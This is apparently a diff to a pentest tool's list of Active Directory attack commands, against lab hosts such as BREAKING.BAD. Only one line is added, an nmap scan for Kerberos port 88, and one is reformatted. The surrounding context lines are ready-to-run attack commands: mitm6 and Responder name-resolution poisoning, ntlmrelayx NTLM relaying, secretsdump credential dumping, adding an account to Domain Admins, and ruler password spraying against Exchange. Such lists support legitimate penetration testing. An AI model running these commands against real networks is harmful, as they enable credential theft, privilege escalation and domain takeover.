@@ -25,7 +25,7 @@ pth-net rpc group addmem "Domain admins" Shutdown -U BREAKING.BAD/Administrator%
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 crackmapexec smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 mitm6 --interface eth0
-mitm6 --interface eth0 --domain BREAKING.BAD 
+mitm6 --interface eth0 --domain BREAKING.BAD
 responder --interface eth0 --wredir --NBTNSdomain --wpad --lm --ProxyAuth --ForceWpadAuth
 ntlmrelayx -tf targets.txt -w -6 -smb2support -socks
 proxychains secretsdump -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
@@ -179,3 +179,4 @@ ruler -k -d example.com -u j.doe -p 'Passw0rd!' -e j.doe@example.com --verbose a
 ruler -k -d example.com brute --users owa-valid-users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a spray-results.txt
 oaburl.py MEGACORP/j.doe:'Passw0rd!'@mx.example.com -e existent.email@example.com
 cypheroth -u neo4j -p exegol4thewin -d BREAKING.BAD
+nmap -sS -n --open -p 88 192.168.56.0/24
